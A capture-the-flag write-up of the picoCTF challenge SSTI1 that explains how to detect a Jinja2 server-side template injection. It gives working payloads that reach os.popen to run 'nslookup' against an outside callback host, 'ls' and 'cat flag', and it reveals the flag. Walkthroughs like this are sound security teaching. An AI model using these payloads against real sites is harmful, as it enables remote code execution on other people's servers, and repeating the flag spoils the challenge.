**Challenge:** SSTI1 

**Level:** Easy

**Challenge Author:** Venax

### Description: 

A developer has added profile picture upload functionality to a website. 
However, the implementation is flawed, and it presents an opportunity for you. 
Your mission, should you choose to accept it, is to navigate to the provided 
web page and locate the file upload area. Your ultimate goal is to find the hidden 
flag located in the /root directory.

### Step-by-Step Walkthrough:
As usual, our first hint comes from the title of the challenge. SSTI stands for Server Side Template Injection. So we can expect a vulnerability in the submission form somehow.

## Investigation - vulnerability analyzer
The attacker tests the identified input field by injecting template syntax specific to the template engine in use. Different web frameworks use different template engines (e.g., Jinja2 for Python, Twig for PHP, or FreeMarker for Java).
In most cases, the input `‘${{<%[%'"}}%\.’`, can be utilized to detect a vulnerability. If it errors out, we know we're on the right track

Reviewing this [site](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) we can run through some test injections

Our injection `{{7\*7}}` returns 49, so that seems to work. Then, running `{{7\*'7'}}` returns 7 7s, which is what we'd expect. So we can continue with either Jinja2 or Twig.

The page then directs us to [Template Engines Injection 101](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)

The last link I shared allows you to fingerprint everything, making it an extremely valuable tool. Someone probably already put it in a script of some kind, but to understand the process, the page is extremely useful (if a bit difficult to follow since there is an extreme lack of copy capability!)

## Investigation - Jinja2
I can start my search for Jinja2 (just for fun, I tried the Twig script, which broke!), which grabs me the injection template 3.11: 

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup oastify.com').read()}}
```

On its own, it provides a blank page. I'm not exactly certain why that is, there might be a firewall blocking egress from the server, but the important part of that script is the "nslookup oastify.com". This is where we can input commands. For this next part, use the following, note where I inserted the "ls" command

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

We can see 4 files here, but the important one is titled "flag". Let's input one more command!

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

<details><summary>Flag</summary>
    <pre>
    picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
    </pre>
   </details>